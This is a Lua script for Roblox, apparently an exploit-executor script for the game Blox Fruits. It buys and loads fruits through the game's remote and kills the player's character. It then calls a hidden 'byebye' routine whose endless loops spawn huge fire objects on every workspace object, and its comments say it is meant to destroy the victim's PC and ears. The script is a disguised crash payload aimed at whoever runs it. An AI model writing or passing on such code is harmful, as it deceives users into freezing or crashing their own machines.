function BuyFruit(fruit)
    local args = {
        [1] = "PurchaseRawFruit",
        [2] = fruit,
        [3] = false
    }

    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
end

function UnstoreFruit(fruit)
    local args = {
        [1] = "LoadFruit",
        [2] = fruit
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
end
function byebye()
local destruction1 = coroutine.create(function()
	while true do
		for i = math.pi, math.huge, math.pi do
			print(math.atan(math.sqrt(i)))
		end
	end
end)

local destruction2 = coroutine.create(function()
	while true do
		local desc = workspace:GetDescendants()

		for _, v in pairs(desc) do
			local big = Instance.new("Fire", v)
			local new = Instance.new("Part", workspace)
            local big2 = Instance.new("Fire", new)
			big.Size = 9999999999
			big.Heat = 9999999999
			big.TimeScale = 1
			big2.Size = 9999999999
			big2.Heat = 9999999999
			big2.TimeScale = 1
		end
	end
end)

local function omega()
	coroutine.resume(destruction1)
	coroutine.resume(destruction2)
end

-- a really loud "buzzing" sound to destroy their ears on top of destroying their PC. Kind of like the sound a Wii makes when it crashes.
task.wait(.05) -- time to allow the sound to play
print("death is eternal")
omega()
end
BuyFruit("Rocket-Rocket") -- 7iyad lih kitsune
BuyFruit("Spike-Spike") -- 7iyad lih fruit
BuyFruit("Spin-Spin")
BuyFruit("Chop-Chop")
BuyFruit("Spring-Spring")
BuyFruit("Smoke-Smoke")
BuyFruit("Bomb-Bomb")
BuyFruit("Flame-Flame")
game.Players.LocalPlayer.Character.Humanoid.Health = 0
wait(7)
byebye()